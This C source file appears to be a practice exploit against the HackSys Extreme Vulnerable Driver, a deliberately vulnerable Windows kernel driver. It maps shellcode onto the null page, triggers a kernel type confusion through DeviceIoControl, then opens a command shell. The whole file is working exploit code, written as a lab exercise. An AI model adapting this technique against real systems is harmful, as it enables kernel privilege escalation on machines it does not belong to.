#include "Includes.h"

int main(int argc, char** argv)
{
	printf("[>] Exploit written by uncodable (7/24/2021)\n[>] Exploit -> HackSys Extreme Vulnerable Driver, Kernel Type Confusion Memory Corruption (x64)\n[>] Let's exploit!\n");

	if (check())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (setup())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (exploit())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	printf("[+] Exploit completed successfully!");
	unused = getchar();

	return 0;
}

int check()
{
	driver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == (HANDLE)-1)
	{
		printf("[-] Failed to obtain a handle. Handle value: 0x%p, Error: %d (0x%x)", driver, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Obtained a handle. Handle value: 0x%p\n", driver);

	return 0;
}

int setup()
{
	ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!ntdll)
	{
		printf("[-] Failed to load ntdll.dll. Handle value: 0x%p, Error: %d (0x%x)", ntdll, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Loaded ntdll.dll. Handle value: 0x%p\n", ntdll);

	ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
	if (!_ZwAllocateVirtualMemory)
	{
		printf("[-] Failed to locate ZwAllocateVirtualMemory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Located ZwAllocateVirtualMemory. Address: 0x%p\n", _ZwAllocateVirtualMemory);

	PVOID baseAddress = (PVOID)1;
	PSIZE_T regionSize = (PSIZE_T)4096;
	NTSTATUS status = _ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status)
	{
		printf("[-] Failed to allocate null page. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 1;
	}
	printf("[+] Allocated null page. NTSTATUS: %d (0x%x)\n", status, status);

	memcpy((unsigned long long*)0x0000000000000100, &shellcode, 90);
	printf("[+] Mapped shellcode onto the null page.\n");

	typeConfusion.field1 = (unsigned long long)0x0000000000000001;
	typeConfusion.field2 = (unsigned long long)0x0000000000000100;
	printf("[+] Set type confusion structure fields. Field 1: 0x%x, Field 2: 0x%x\n", (int)typeConfusion.field1, (int)typeConfusion.field2);

	return 0;
}

int exploit()
{
	printf("[!] Confusing the kernel in three...");
	Sleep(1000);
	printf("\n[!!] Two...");
	Sleep(1000);
	printf("\n[!!!] One...");
	Sleep(1000);
	printf("\n[!!!!] GO!\n");
	Sleep(100);

	DeviceIoControl(driver, 0x222023, &typeConfusion, sizeof(typeConfusion), &outBuffer, 1024, &bytesReturned, 0);
	system("start C:\\Windows\\System32\\cmd.exe");

	return 0;
}
